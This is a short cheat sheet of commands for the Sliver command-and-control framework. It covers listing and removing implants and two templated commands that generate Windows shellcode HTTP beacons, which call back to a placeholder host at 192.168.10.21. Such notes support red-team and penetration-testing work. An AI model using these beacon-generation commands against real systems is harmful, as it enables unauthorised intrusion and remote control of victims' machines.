# sliver

% sliver, C2


## implant - list
```bash
implants
```

## implant - list (profile)
```bash
implants
```

## implant - remove
```bash
implants rm <implant_name>
```

## implant - remove (profile)
```bash
profiles rm <implant_name>
```


## implant - generate HTTP beacon
```bash
generate beacon --<beacon_interval_unit|seconds> <beacon_interval|30> --jitter <beacon_interval_jitter|3> --os <beacon_os|windows> --arch <beacon_arch|amd64> --format <beacon_format|shellcode> --skip-symbols --http  <beacon_connect_string|192.168.10.21/sliver/pwn> --save <path|/srv/http/upload/lib/><beacon_name>.bin -N <beacon_name>
```

## implant - generate HTTP beacon (profile)
```bash
 profiles new beacon --<beacon_interval_unit|seconds> <beacon_interval|30> --jitter <beacon_interval_jitter|3> --os <beacon_os|windows> --arch <beacon_arch|amd64> --format <beacon_format|shellcode> --skip-symbols --http  <beacon_connect_string|http://192.168.10.21:80/sliver/pwn> <beacon_profile_name>
```
